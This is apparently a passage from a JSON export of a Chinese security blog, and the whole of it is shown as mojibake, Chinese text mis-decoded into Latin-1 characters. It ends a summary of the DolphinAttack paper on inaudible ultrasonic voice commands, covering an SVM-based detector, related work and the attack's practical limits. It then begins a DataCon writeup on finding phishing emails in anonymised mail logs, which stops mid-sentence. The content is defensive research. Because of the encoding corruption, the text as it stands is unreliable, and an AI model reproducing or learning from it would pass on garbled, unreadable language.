·çš„å‘½ä»¤å–æ¶ˆè¿‡ç¨‹ä¸ä¼šå½±å“éº¦å…‹é£çš„æ­£å¸¸æ“ä½œï¼Œå› ä¸ºæ•è·çš„å¯å¬è¯­éŸ³ä¿¡å·ä¸è¶…å£°èŒƒå›´å†…çš„å™ªå£°ä¹‹é—´å°†ä¸å­˜åœ¨ç›¸å…³æ€§ã€‚ 7.2 åŸºäºè½¯ä»¶çš„é˜²å¾¡åŸºäºè½¯ä»¶çš„é˜²å¾¡ç ”ç©¶è°ƒåˆ¶è¯­éŸ³å‘½ä»¤çš„ç‹¬ç‰¹åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½ä¸çœŸæ­£çš„è¯­éŸ³å‘½ä»¤ä¸åŒã€‚å¦‚å›¾17æ‰€ç¤ºï¼Œæ¢å¤çš„ï¼ˆè§£è°ƒçš„ï¼‰æ”»å‡»ä¿¡å·åœ¨500åˆ°1000Hzçš„é«˜é¢‘èŒƒå›´å†…æ˜¾ç¤ºå‡ºä¸åŸå§‹ä¿¡å·å’Œè®°å½•ä¿¡å·çš„å·®å¼‚ã€‚åŸå§‹ä¿¡å·ç”±Google TTSå¼•æ“äº§ç”Ÿï¼Œè°ƒåˆ¶çš„è½½æ³¢é¢‘ç‡ä¸º25 kHzã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ†æ500è‡³1000 Hzé¢‘ç‡èŒƒå›´å†…çš„ä¿¡å·æ¥æ£€æµ‹DolphinAttackã€‚ç‰¹åˆ«æ˜¯ï¼ŒåŸºäºæœºå™¨å­¦ä¹ çš„åˆ†ç±»å™¨å°†å¯¹å…¶è¿›è¡Œæ£€æµ‹ã€‚ä¸ºäº†éªŒè¯æ£€æµ‹DolphinAttackçš„å¯è¡Œæ€§ï¼Œæˆ‘ä»¬åˆ©ç”¨æ”¯æŒçš„çŸ¢é‡æœºï¼ˆSVMï¼‰ä½œä¸ºåˆ†ç±»å™¨ï¼Œå¹¶ä»éŸ³é¢‘ä¸­æå–äº†æ—¶åŸŸå’Œé¢‘åŸŸä¸­çš„15ä¸ªç‰¹å¾ã€‚æˆ‘ä»¬ç”Ÿæˆäº†12ç§è¯­éŸ³å‘½ä»¤ï¼ˆå³â€œ Hey Siriâ€ï¼‰ï¼šNeoSpeech TTSå¼•æ“æä¾›äº†8ç§è¯­éŸ³ï¼ŒSelvy TTSå¼•æ“æä¾›äº†4ç§è¯­éŸ³ã€‚å¯¹äºæ¯ç§ç±»å‹ï¼Œæˆ‘ä»¬è·å¾—äº†ä¸¤ä¸ªæ ·æœ¬ï¼šä¸€ä¸ªè¢«è®°å½•ï¼Œå¦ä¸€ä¸ªè¢«æ¢å¤ã€‚æ€»å…±æœ‰24ä¸ªæ ·æœ¬ã€‚ä¸ºäº†è®­ç»ƒSVMåˆ†ç±»å™¨ï¼Œæˆ‘ä»¬ä½¿ç”¨5ä¸ªå½•åˆ¶çš„éŸ³é¢‘ä½œä¸ºæ­£æ ·æœ¬ï¼Œå¹¶ä½¿ç”¨5ä¸ªæ¢å¤çš„éŸ³é¢‘ä½œä¸ºè´Ÿæ ·æœ¬ã€‚å…¶ä½™14ä¸ªæ ·æœ¬ç”¨äºæµ‹è¯•ã€‚åˆ†ç±»å™¨å¯ä»¥ä»¥100ï¼…çœŸå®è‚¯å®šç‡ï¼ˆ7/7ï¼‰å’Œ100ï¼…çœŸå®å¦å®šç‡ï¼ˆ7/7ï¼‰åŒºåˆ†æ¢å¤çš„éŸ³é¢‘å’Œå½•åˆ¶çš„éŸ³é¢‘ã€‚ä½¿ç”¨ç®€å•SVMåˆ†ç±»å™¨çš„ç»“æœè¡¨æ˜å¯ä»¥ä½¿ç”¨åŸºäºè½¯ä»¶çš„é˜²å¾¡ç­–ç•¥æ¥æ£€æµ‹DolphinAttackã€‚ 8 ç›¸å…³å·¥ä½œ è¯­éŸ³å¯æ§ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚è¶Šæ¥è¶Šå¤šçš„ç ”ç©¶å·¥ä½œæŠ•å…¥äºç ”ç©¶è¯­éŸ³å¯æ§ç³»ç»Ÿçš„å®‰å…¨æ€§[10ã€18ã€28ã€38ã€61]ã€‚ Kasmiç­‰ã€‚ [28]é€šè¿‡åœ¨è€³æœºç”µç¼†ä¸Šæ–½åŠ æœ‰æ„çš„ç”µç£å¹²æ‰°ï¼Œå¯¹ç°ä»£æ™ºèƒ½æ‰‹æœºå¼•å…¥äº†è¯­éŸ³å‘½ä»¤æ³¨å…¥æ”»å‡»ï¼Œè€Œåœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡åˆ©ç”¨è¶…å£°æ³¢ä¸Šçš„éº¦å…‹é£éçº¿æ€§æ¥æ³¨å…¥è¯­éŸ³å‘½ä»¤ã€‚ Mukhopadhyayç­‰ã€‚ [38]å±•ç¤ºäº†å¯¹æœ€å…ˆè¿›çš„è‡ªåŠ¨è¯´è¯äººéªŒè¯ç®—æ³•çš„è¯­éŸ³æ¨¡ä»¿æ”»å‡»ã€‚ä»–ä»¬æ ¹æ®å—å®³è€…çš„æ ·æœ¬å»ºç«‹äº†å—å®³è€…å£°éŸ³çš„æ¨¡å‹ã€‚ [18]è®¾è®¡äº†ä¸€ç§æƒé™ç»•è¿‡æ¥è‡ªé›¶è®¸å¯Androidåº”ç”¨ç¨‹åºé€šè¿‡ç”µè¯æ‰¬å£°å™¨çš„æ”»å‡»ã€‚éšè—çš„è¯­éŸ³å‘½ä»¤å’ŒCocaine noodles[10ï¼Œ61]ä½¿ç”¨å¯å¬å’Œæ‰­æ›²çš„éŸ³é¢‘å‘½ä»¤æ¥æ”»å‡»è¯­éŸ³è¯†åˆ«ç³»ç»Ÿã€‚åœ¨è¿™äº›æ”»å‡»ä¸‹ï¼Œå—å®³è€…æœ‰æ—¶å¯ä»¥è§‚å¯Ÿåˆ°æ··æ·†çš„è¯­éŸ³å‘½ä»¤ã€‚ DolphinAttackå—è¿™äº›æ”»å‡»çš„åŠ¨æœºï¼Œä½†æ˜¯å®Œå…¨å¬ä¸è§ä¸”å¬ä¸åˆ°ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¯ä»¥ä½¿ç”¨ä¾¿æºå¼è®¾å¤‡å¯åŠ¨DolphinAttack é…å¤‡ä¼ æ„Ÿå™¨çš„è®¾å¤‡çš„å®‰å…¨æ€§ã€‚é…å¤‡æœ‰å„ç§ä¼ æ„Ÿå™¨çš„å•†ä¸šè®¾å¤‡ï¼ˆä¾‹å¦‚ï¼Œæ™ºèƒ½æ‰‹æœºï¼Œå¯ç©¿æˆ´è®¾å¤‡å’Œå¹³æ¿ç”µè„‘ï¼‰æ­£åœ¨é€æ¸æ™®åŠã€‚éšç€æ— å¤„ä¸åœ¨çš„ç§»åŠ¨è®¾å¤‡çš„å¢é•¿è¶‹åŠ¿ï¼Œå®‰å…¨æ€§æˆä¸ºäººä»¬å…³æ³¨çš„ç„¦ç‚¹ã€‚è®¸å¤šç ”ç©¶äººå‘˜[14ã€15ã€46ã€60]ä¸“æ³¨äºç ”ç©¶å¯¹æ™ºèƒ½è®¾å¤‡ä¸Šçš„ä¼ æ„Ÿå™¨çš„å¯èƒ½æ”»å‡»ã€‚å…¶ä¸­ï¼Œä¼ æ„Ÿå™¨æ¬ºéª—ï¼ˆå³ï¼Œå°†æ¶æ„ä¿¡å·æ³¨å…¥å—å®³è€…ä¼ æ„Ÿå™¨ï¼‰å¼•èµ·äº†å¹¿æ³›å…³æ³¨ï¼Œå¹¶è¢«è®¤ä¸ºæ˜¯å¯¹é…å¤‡ä¼ æ„Ÿå™¨çš„è®¾å¤‡çš„æœ€ä¸¥é‡å¨èƒä¹‹ä¸€ã€‚ Shinç­‰ã€‚å°†ä¼ æ„Ÿå™¨æ¬ºéª—æ”»å‡»[46]åˆ†ä¸ºä¸‰ç±»ï¼šå¸¸è§„ä¿¡é“æ”»å‡»ï¼ˆé‡æ”¾æ”»å‡»ï¼‰[19ã€26ã€66]ï¼Œä¼ è¾“ä¿¡é“æ”»å‡»å’Œä¾§ä¿¡é“æ”»å‡»[11ã€14ã€15ã€47ã€49]ã€‚ Deanç­‰ã€‚ [14ï¼Œ15]è¯æ˜ï¼Œå½“å£°é¢‘åˆ†é‡æ¥è¿‘é™€èºä»ªä¼ æ„Ÿè´¨é‡çš„å…±æŒ¯é¢‘ç‡æ—¶ï¼ŒMEMSé™€èºä»ªå®¹æ˜“å—åˆ°å¤§åŠŸç‡é«˜é¢‘å£°å™ªå£°çš„å½±å“ã€‚åˆ©ç”¨æœºè½½ä¼ æ„Ÿå™¨ï¼ŒGuç­‰ã€‚ [24]è®¾è®¡äº†ä¸€ç§ä½¿ç”¨æŒ¯åŠ¨é©¬è¾¾å’ŒåŠ é€Ÿåº¦è®¡çš„åŠ å¯†å¯†é’¥ç”Ÿæˆæœºåˆ¶ã€‚æˆ‘ä»¬çš„å·¥ä½œé‡ç‚¹æ˜¯éº¦å…‹é£ï¼Œå¯ä»¥å°†å…¶è§†ä¸ºä¸€ç§ä¼ æ„Ÿå™¨ã€‚ é€šè¿‡ä¼ æ„Ÿå™¨æ³„éœ²éšç§ã€‚ Michalevskyç­‰ã€‚ [36]åˆ©ç”¨MEMSé™€èºä»ªæ¥æµ‹é‡å£°å­¦ä¿¡å·ï¼Œä»è€Œæ­ç¤ºæ‰¬å£°å™¨ä¿¡æ¯ã€‚ Schlegelç­‰ã€‚ [44]è®¾è®¡äº†ä¸€ç§æœ¨é©¬ç¨‹åºï¼Œå¯ä»¥ä»æ™ºèƒ½æ‰‹æœºçš„éŸ³é¢‘ä¼ æ„Ÿå™¨ä¸­æå–é«˜ä»·å€¼æ•°æ®ã€‚ Owusuç­‰ã€‚ [40]åˆ©ç”¨åŠ é€Ÿåº¦è®¡çš„è¯»æ•°ä½œä¸ºå‰¯é€šé“ï¼Œåœ¨æ™ºèƒ½æ‰‹æœºè§¦æ‘¸å±é”®ç›˜ä¸Šæå–è¾“å…¥æ–‡æœ¬çš„æ•´ä¸ªåºåˆ—ï¼Œè€Œæ— éœ€ç‰¹æ®Šçš„ç‰¹æƒã€‚ Avivç­‰ã€‚ [6]è¯æ˜äº†åŠ é€Ÿåº¦ä¼ æ„Ÿå™¨å¯ä»¥æ­ç¤ºç”¨æˆ·çš„ç‚¹å‡»å’ŒåŸºäºæ‰‹åŠ¿çš„è¾“å…¥ã€‚ Deyç­‰ã€‚ [17]ç ”ç©¶äº†å¦‚ä½•åˆ©ç”¨è½¦è½½åŠ é€Ÿåº¦è®¡çš„ç¼ºé™·å¯¹æ™ºèƒ½æ‰‹æœºè¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œå¹¶ä¸”æŒ‡çº¹å¯ä»¥ç”¨ä½œè¯†åˆ«æ™ºèƒ½æ‰‹æœºæ‰€æœ‰è€…çš„æ ‡è¯†ç¬¦ã€‚è¥¿è’™ç­‰ã€‚ [48]åˆ©ç”¨æ‘„åƒæœºå’Œéº¦å…‹é£æ¥æ¨æ–­åœ¨æ™ºèƒ½æ‰‹æœºçš„ä»…æ•°å­—è½¯é”®ç›˜ä¸Šè¾“å…¥çš„PINã€‚ Liç­‰ã€‚æ–‡çŒ®[33]å¯ä»¥æ ¹æ®ç…§ç‰‡ä¸­çš„é˜´å½±å’Œç›¸æœºçš„ä¼ æ„Ÿå™¨è¯»æ•°ï¼Œé€šè¿‡ä¼°è®¡å¤ªé˜³ä½ç½®æ¥éªŒè¯ç…§ç‰‡çš„æ•è·æ—¶é—´å’Œä½ç½®ã€‚ Sunç­‰ã€‚ [55]æå‡ºäº†ä¸€ä¸ªè§†é¢‘è¾…åŠ©æŒ‰é”®æ¨è®ºæ¡†æ¶ï¼Œä»¥ä»å¹³æ¿ç”µè„‘åŠ¨ä½œçš„ç§˜å¯†è§†é¢‘è®°å½•ä¸­æ¨æ–­å‡ºå¹³æ¿ç”µè„‘ç”¨æˆ·çš„è¾“å…¥ã€‚ Backesç­‰ã€‚ [7]æ˜¾ç¤ºï¼Œå¯ä»¥æ ¹æ®æ‰“å°æœºçš„å£°éŸ³æ¢å¤å¤„ç†è‹±è¯­çš„ç‚¹é˜µæ‰“å°æœºæ­£åœ¨æ‰“å°çš„å†…å®¹ã€‚åŒæ ·ï¼Œæˆ‘ä»¬ç ”ç©¶äº†å¦‚ä½•åˆ©ç”¨éº¦å…‹é£æ¼æ´æ¥ç ´åå®‰å…¨å’Œéšç§ã€‚ç½—ä¼Šç­‰ã€‚ [42]æå‡ºäº†BackDoorï¼Œå®ƒåœ¨è¶…å£°é¢‘å¸¦ä¸Šçš„ä¸¤ä¸ªæ‰¬å£°å™¨å’Œéº¦å…‹é£ä¹‹é—´å»ºç«‹äº†ä¸€ä¸ªå£°éŸ³ï¼ˆä½†å¬ä¸è§ï¼‰é€šä¿¡é€šé“ã€‚ç‰¹åˆ«æ˜¯ï¼ŒBackDooråˆ©ç”¨ä¸¤ä¸ªè¶…å£°æ³¢æ‰¬å£°å™¨ä¼ è¾“ä¸¤ä¸ªé¢‘ç‡ã€‚é€šè¿‡éº¦å…‹é£çš„éçº¿æ€§æŒ¯è†œå’ŒåŠŸç‡æ”¾å¤§å™¨åï¼Œè¿™ä¸¤ä¸ªä¿¡å·åœ¨å¯å¬é¢‘ç‡èŒƒå›´å†…äº§ç”Ÿä¸€ä¸ªâ€œé˜´å½±â€ï¼Œå¯ä»¥æºå¸¦æ•°æ®ã€‚ä½†æ˜¯ï¼Œâ€œé˜´å½±â€æ˜¯å•ä¸€éŸ³è°ƒï¼Œè€Œä¸æ˜¯ç”±ä¸°å¯ŒéŸ³è°ƒé›†ç»„æˆçš„è¯­éŸ³å‘½ä»¤ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œæˆ‘ä»¬è¡¨æ˜å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ‰¬å£°å™¨å‘SRç³»ç»Ÿæ³¨å…¥å¬ä¸è§çš„å‘½ä»¤ï¼Œä»è€Œå¼•èµ·å„ç§å®‰å…¨å’Œéšç§é—®é¢˜ã€‚ 9 æµ·è±šæ”»å‡»â€çš„å±€é™æ€§åˆ†æä¸Šé¢è°ˆåˆ°äº†â€œæµ·è±šæ”»å‡»â€å®ç°çš„åŸºæœ¬åŸç†ã€‚ä½†æ˜¯ç»è¿‡æˆ‘ä»¬çš„åˆ†æï¼Œè¿™ç§â€œæ¼æ´â€è™½ç„¶ç†è®ºä¸Šå­˜åœ¨é£é™©ï¼Œä½†æ˜¯å®ç°ä»£ä»·è¾ƒå¤§ï¼Œä¸”æ•´ä½“å¯è¡Œæ€§è¾ƒä½ï¼Œå¤§å®¶ä¸å¿…è¿‡äºææƒ§ã€‚ä¸‹é¢æˆ‘ä»¬å†æ¥åˆ†æä¸€ä¸‹å®ƒèƒ½å®ç°çš„æ•ˆæœçš„å±€é™æ€§ï¼š å±€é™æ€§1ï¼š æµ‹è¯•è®¾å¤‡å‘å°„è¦æ±‚é«˜ï¼Œä¸æ˜“éšè—ä½œæ¡ˆã€‚é¦–å…ˆï¼Œè¯¥ç³»ç»Ÿéœ€è¦ä¸€ä¸ªå¤§åŠŸç‡ä¸”å¤§å°ºå¯¸çš„ä¿¡å·å‘ç”Ÿå™¨æ¥ç”Ÿæˆé«˜è´¨é‡çš„è¶…å£°ä¿¡å·ï¼›åŒæ—¶ï¼Œç›®å‰çš„æ™®é€šéº¦å…‹é£å¯¹20KHzä»¥ä¸Šçš„ä¿¡å·é¢‘å“è¡°å‡éå¸¸å¤§ï¼Œè¿™å°±è¦æ±‚è¶…å£°ä¿¡å·çš„å‘å°„åŠŸç‡æœ‰ç›¸å½“å¤§çš„å‘å°„åŠŸç‡ã€‚è¿™ç¯‡æ–‡ç« ä¸­ä½¿ç”¨çš„è¶…å£°å‘å°„å™¨å¯ä»¥æ”¯æŒåˆ°300MHzçš„é¢‘ç‡èŒƒå›´ï¼Œè¶…å£°æ’­æ”¾çš„å£°å‹çº§è¾¾åˆ°äº†125dBLï¼Œè¿™ç§æƒ…å†µä¸‹æ™®é€šçš„ç®€åŒ–è£…ç½®çš„æ”¾å¤§å™¨å’Œå–‡å­æ˜¯å®ç°ä¸äº†çš„ã€‚ å±€é™æ€§2ï¼š æ”»å‡»è·ç¦»å¾ˆçŸ­ï¼Œæ™ºèƒ½å®¶å±…äº§å“ä¸å—å½±å“ã€‚åŒæ ·æ˜¯ç”±äºç›®å‰æ™®é€šéº¦å…‹é£å¯¹20KHzä»¥ä¸Šçš„ä¿¡å·é¢‘å“è¡°å‡éå¸¸å¤§ï¼Œåœ¨å£°å‹çº§æ˜¯125dBLçš„æ’­æ”¾çš„è¶…å£°ä¿¡å·ä¸‹ï¼ˆè¿™ä¸ªéŸ³é‡å·²ç»éœ€è¦éå¸¸ä¸“ä¸šæ’­æ”¾è®¾å¤‡äº†ï¼‰ï¼Œå®éªŒçš„æœ€è¿œå†²å‡»è·ç¦»åªæœ‰1.75mï¼Œå¯¹äºå¤§éƒ¨åˆ†è®¾å¤‡è¶…è¿‡0.5må°±æ²¡æœ‰å“åº”äº†ï¼Œå†åŠ ä¸Šè¶…å£°ä¿¡å·æ²¡æœ‰ç©¿å¢™èƒ½åŠ›ï¼Œå› æ­¤å¯¹äºæ”¾åœ¨å®¶ä¸­çš„æ™ºèƒ½ç¡¬ä»¶è®¾å¤‡æ˜¯æ²¡æœ‰ä»»ä½•å½±å“çš„ã€‚å¯¹äºæºå¸¦åˆ°å…¬å…±åœºæ‰€çš„æ‰‹æœºå’Œå¯ç©¿æˆ´è®¾å¤‡åˆ™æœ‰ä¸€å®šçš„â€œé£é™©â€ã€‚ å±€é™æ€§3ï¼š æ”»å‡»è¯­éŸ³è´¨é‡å¾ˆä½ï¼Œæ•ˆæœå’Œå•ä¸ªç¡¬ä»¶ç›¸å…³ã€‚å¦‚å‰é¢æˆ‘ä»¬çš„åˆ†æï¼Œç”±äºè§£è°ƒåçš„ä¿¡å·æ¯•ç«Ÿæ˜¯ç»è¿‡ä½é€šæ»¤æ³¢å™¨ï¼Œå¯¼è‡´å„é¢‘å¸¦éƒ½æ˜¯æœ‰ä¸åŒç¨‹åº¦è¡°å‡çš„ï¼Œä¸”å¤§éƒ¨åˆ†ADCéƒ½æœ‰æŠ—æ··å æ»¤æ³¢ï¼Œå› æ­¤æœ€ç»ˆè®¾å¤‡ç«¯è§£è°ƒè¿›æ¥çš„Basebandä¿¡å·å¤±çœŸå¾ˆä¸¥é‡ï¼Œä¿¡å™ªæ¯”ä¹Ÿä¸ä¼šå¾ˆé«˜ã€‚æ”»å‡»æ•ˆæœä¹Ÿè·Ÿç¡¬ä»¶æœ¬èº«ç›¸å…³ï¼Œæ¯”å¦‚éº¦å…‹é£å‹å·ã€ä½é€šæ»¤æ³¢å™¨çš„å®ç°æ–¹å¼å’Œæ•ˆæœã€ADCæŠ—æ··å æ•ˆæœå’Œé‡‡æ ·é¢‘ç‡éƒ½æ˜¯ç›¸å…³çš„ã€‚æƒ³è¦è¾¾åˆ°å¥½çš„æ•ˆæœå¿…é¡»æ ¹æ®å®é™…çš„ç¡¬ä»¶æ¥è°ƒèŠ‚è½½æ³¢é¢‘ç‡ï¼Œä¿¡å·å¼ºåº¦ç­‰å‚æ•°ï¼Œè¿™å¯¹äºå…¬å…±åœºæ‰€æ¸¸èµ°ä½œæ¡ˆï¼Œä¸”ä¸çŸ¥é“è¢«æ”»å‡»è€…ä½¿ç”¨çš„ä»€ä¹ˆè®¾å¤‡çš„æƒ…å†µä¸‹æ˜¯æ¯”è¾ƒéš¾ä»¥å®ç°çš„ã€‚ 10 ç»“è®ºåœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†DolphinAttackï¼Œè¿™æ˜¯å¯¹SRç³»ç»Ÿçš„å¬ä¸è§çš„æ”»å‡»ã€‚ DolphinAttackåˆ©ç”¨AMï¼ˆæŒ¯å¹…è°ƒåˆ¶ï¼‰æŠ€æœ¯æ¥è°ƒåˆ¶è¶…å£°è½½æ³¢ä¸Šçš„å¯å¬è¯­éŸ³å‘½ä»¤ï¼Œä»è€Œä½¿äººæ— æ³•æ„ŸçŸ¥å‘½ä»¤ä¿¡å·ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨DolphinAttackæ”»å‡»ä¸»è¦çš„SRç³»ç»Ÿï¼ŒåŒ…æ‹¬Siriï¼ŒGoogle Nowï¼ŒAlexaç­‰ã€‚ä¸ºé¿å…å®é™…æ»¥ç”¨DolphinAttackï¼Œæˆ‘ä»¬ä»ç¡¬ä»¶å’Œè½¯ä»¶ä¸¤ä¸ªæ–¹é¢æå‡ºäº†ä¸¤ç§é˜²å¾¡è§£å†³æ–¹æ¡ˆã€‚","categories":[{"name":"é¡¶ä¼šè®ºæ–‡","slug":"é¡¶ä¼šè®ºæ–‡","permalink":"https://cool-y.github.io/categories/é¡¶ä¼šè®ºæ–‡/"}],"tags":[{"name":"ç¡¬ä»¶æ”»å‡»","slug":"ç¡¬ä»¶æ”»å‡»","permalink":"https://cool-y.github.io/tags/ç¡¬ä»¶æ”»å‡»/"},{"name":"ä¼ æ„Ÿå™¨","slug":"ä¼ æ„Ÿå™¨","permalink":"https://cool-y.github.io/tags/ä¼ æ„Ÿå™¨/"},{"name":"è¯­éŸ³åŠ©æ‰‹","slug":"è¯­éŸ³åŠ©æ‰‹","permalink":"https://cool-y.github.io/tags/è¯­éŸ³åŠ©æ‰‹/"}]},{"title":"DataCon Coremailé‚®ä»¶å®‰å…¨ç¬¬ä¸‰é¢˜ Writeup","slug":"coremail","date":"2020-10-16T03:07:33.000Z","updated":"2021-04-10T13:38:12.227Z","comments":true,"path":"2020/10/16/coremail/","link":"","permalink":"https://cool-y.github.io/2020/10/16/coremail/","excerpt":"","text":"èµ›é¢˜ç†è§£ç›®æ ‡ åœ¨çœŸå®çš„ä¼ä¸šç½‘ç»œç¯å¢ƒä¸­ï¼Œä¸€äº›æ”»å‡»è€…æ€»èƒ½æƒ³æ–¹è®¾æ³•ç»•è¿‡é‚®ä»¶æ£€æµ‹å¼•æ“ï¼Œä½¿æ”»å‡»é‚®ä»¶æŠµè¾¾å‘˜å·¥çš„æ”¶ä»¶ç®±ï¼Œæœ€ç»ˆè¾¾åˆ°çªƒå–ç”¨æˆ·ç™»å½•å‡­è¯ç­‰ç›®çš„ã€‚ä¸æ­¤åŒæ—¶ï¼Œä¼ä¸šç½‘ç»œå®‰å…¨ç®¡ç†å›¢é˜Ÿçš„ç²¾åŠ›ååˆ†æœ‰é™ï¼Œä¸å¯èƒ½å®ç°å¯¹ä¼ä¸šçš„å…¨éƒ¨é‚®ä»¶è¿›è¡Œé€ä¸€å®¡æŸ¥ã€‚ å¦‚æœä½ æ˜¯ä¸€å®¶ä¼ä¸šçš„é‚®ä»¶å®‰å…¨è´Ÿè´£äººï¼Œèƒ½å¦åŸºäºæ•°æ®åˆ†æï¼Œåˆ©ç”¨é•¿è¾¾ä¸‰ä¸ªæœˆçš„ä¼ä¸šé‚®ä»¶æœåŠ¡å™¨æ—¥å¿—æ‘˜è¦ä¿¡æ¯ï¼Œè®¾è®¡æ£€æµ‹æ¨¡å‹ï¼Œè¾“å‡ºä¸€æ‰¹å¨èƒç¨‹åº¦è¾ƒé«˜çš„é‚®ä»¶ï¼Œä»¥ä¾¿äºåç»­çš„äººå·¥å®¡æŸ¥ã€‚è¯·æ³¨æ„ï¼šæ£€æµ‹æ¨¡å‹ä¸å…è®¸ä½¿ç”¨ç¬¬ä¸‰æ–¹å¨èƒæƒ…æŠ¥ï¼Œæ£€æµ‹ç³»ç»Ÿå¿…é¡»èƒ½å¤Ÿç¦»çº¿è¿è¡Œã€‚ ä»èµ›é¢˜è¯´æ˜ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æå–å‡ºå‡ ä¸ªå…³é”®è¯ï¼šé‚®ä»¶ã€çªƒå–ç”¨æˆ·å‡­è¯ã€å¨èƒç¨‹åº¦ã€ç¦»çº¿è¿è¡Œï¼Œæœ€ç»ˆç›®çš„æ˜¯ä»é‚®ä»¶é€šä¿¡æ—¥å¿—ä¸­ç­›é€‰å‡ºé’“é±¼é‚®ä»¶ï¼ˆçªƒå–ç”¨æˆ·ç™»å½•å‡­è¯ï¼‰ã€‚ æ•°æ® çº¦80ä¸‡å°é‚®ä»¶é€šä¿¡æ—¥å¿—ï¼Œèµ›äº‹ä¸»åŠæ–¹å·²ç»å¯¹æ•°æ®è¿›è¡Œäº†è„±æ•å’ŒåŒ¿ååŒ–å¤„ç†ã€‚ æç¤ºï¼šæ ¹æ®æ—¢å¾€ç»éªŒçŸ¥è¯†ï¼Œå¨èƒç¨‹åº¦è¾ƒé«˜çš„é‚®ä»¶è§„æ¨¡çº¦åœ¨2åƒè‡³2ä¸‡å·¦å³ã€‚ ä¸»åŠæ–¹ç»™äº†å¨èƒé‚®ä»¶çš„å¤§è‡´æ•°é‡èŒƒå›´ï¼Œé‚®ä»¶é€šä¿¡æ—¥å¿—ä¸ç¬¬ä¸€é¢˜çœŸå®çš„é‚®ä»¶æ ¼å¼ä¸åŒï¼Œæ¯ä¸€å°é‚®ä»¶éƒ½æ˜¯jsonæ ¼å¼çš„æ•°æ®ï¼Œåªä¿ç•™äº†8ä¸ªå­—æ®µï¼Œè€Œä¸”åšäº†åŒ¿ååŒ–å¤„ç†ã€‚ 123456789* rcptï¼šæ”¶ä¿¡äººé‚®ç®±åœ°å€ ---&gt; [salt+hash]@[salt+hashæ›¿æ¢æ‰æ•æ„ŸåŸŸåï¼Œå…¶å®ƒä¿ç•™].[çœŸå®TLD]* senderï¼šå‘ä»¶äººé‚®ç®±åœ°å€ ---&gt; åŒä¸Š* ipï¼šä¼ä¸šé‚®ç®±ç”¨æˆ·ç™»å½•ip ---&gt; ç»è¿‡æ˜ å°„å¤„ç†ï¼Œä¸æ˜¯çœŸå®çš„ipåœ°å€ï¼Œä½†ä¿ç•™å­ç½‘å…³ç³»* fromnameï¼šå‘ä¿¡äººåç§° ---&gt; å¯¹äºç™½åå•å…³é”®è¯ï¼ˆæ¯”å¦‚adminï¼Œhrï¼Œç®¡ç†å‘˜ï¼Œç»ç†ç­‰ï¼‰è¿›è¡Œä¿ç•™ã€‚é™¤äº†ç™½åå•çš„å…¶å®ƒéƒ¨åˆ†salt+hash* urlï¼šç›´æ¥ä»é‚®ä»¶æ­£æ–‡ã€subjectã€é™„ä»¶ã€fromnameä¸­æå–å‡ºæ¥çš„url ---&gt; [çœŸå®åè®®]://hash+saltæ›¿æ¢æ‰æ•æ„ŸåŸŸå.çœŸå®TLD/çœŸå®å‚æ•°* @timestampï¼šæ—¶é—´æˆ³* regionï¼šä¼ä¸šé‚®ç®±ç”¨æˆ·ç™»å½•ipæ‰€åœ¨åœ°åŒº* authuserï¼šæ”¶ä¿¡æ—¶Falseï¼Œå‘ä¿¡æ—¶Trueï¼Œæ³¨æ„ä¼ä¸šé‚®ç®±åŸŸå†…äº’å‘çš„è¯æ˜¯åªæœ‰ä¸€æ¡å‘ä¿¡è®°å½•* tagï¼šé‚®ä»¶ç¼–å·ï¼Œæäº¤ç­”æ¡ˆéœ€è¦ç”¨åˆ° æäº¤è§„åˆ™ä¸»åŠæ–¹ç»™çš„æ–¹æ³•å¾ˆç®€å•ï¼Œæ¯ä¸€å°é‚®ä»¶å‡æœ‰å­—æ®µtagï¼Œç»“æœåªéœ€è¦æ¯è¡Œä¸€ä¸ªå¨èƒé‚®ä»¶çš„tagï¼Œæ¢è¡Œä½¿ç”¨\\n è¯„åˆ† æ¯”èµ›è¿‡ç¨‹ä¸­æ’è¡Œæ¦œå±•ç¤ºæ¯ä½é€‰æ‰‹çš„F1-scoreï¼Œæœªæäº¤ç­”æ¡ˆF1-scoreè§†ä¸º0ï¼Œæ¯”èµ›ç»“æŸåï¼Œæ¯ä½é€‰æ‰‹çš„å¾—åˆ†ç”±min-maxå½’ä¸€åŒ–*100è®¡ç®—å¾—å‡ºï¼Œä¿ç•™1ä½å°æ•°ï¼ˆå››èˆäº”å…¥ï¼‰ æœ€ç»ˆå¾—åˆ†ä¸ä»…å–å†³äºè‡ªå·±çš„F1-scoreï¼Œè¿˜å–å†³äºæ‰€æœ‰é€‰æ‰‹çš„æ•´ä½“æˆç»©ã€‚å¦å¤–åˆ©ç”¨F1-scoreï¼Œæˆ‘ä»¬è¿˜èƒ½æ¨æµ‹å‡ºè¿™80ä¸‡å°é‚®ä»¶ä¸­å¤§è‡´çš„å¨èƒé‚®ä»¶æ•°é‡ï¼Œåç»­å†è¯´ã€‚ è§£é¢˜æ€è·¯åœ¨åˆæ­¥æµè§ˆäº†ä¸€äº›é‚®ä»¶æ—¥å¿—å†…å®¹åï¼Œæˆ‘ä»¬å°†ç›®æ ‡é”å®šä¸ºå¯»æ‰¾é’“é±¼é‚®ä»¶çš„æ•°é‡ã€‚é¦–å…ˆéœ€è¦çŸ¥é“é’“é±¼é‚®ä»¶æ˜¯ä»€ä¹ˆï¼Œå…·å¤‡å“ªäº›ç‰¹å¾ã€‚ 1. ä½¿ç”¨çŸ­é“¾æ¥çŸ­é“¾æ¥å°±æ˜¯å°†è¾ƒé•¿çš„ç½‘å€ï¼Œé€šè¿‡ç‰¹å®šçš„ç®—æ³•è½¬æ¢ä¸ºç®€çŸ­çš„ç½‘å€å­—ç¬¦ä¸²ã€‚ç”¨æˆ·æ— æ³•é€šè¿‡çŸ­é“¾æ¥åœ°å€ç›´æ¥çœ‹å‡ºç‚¹å‡»è¿™ä¸ªçŸ­é“¾æ¥åœ°å€åç©¶ç«Ÿä¼šæ‰“å¼€ä»€ä¹ˆæ 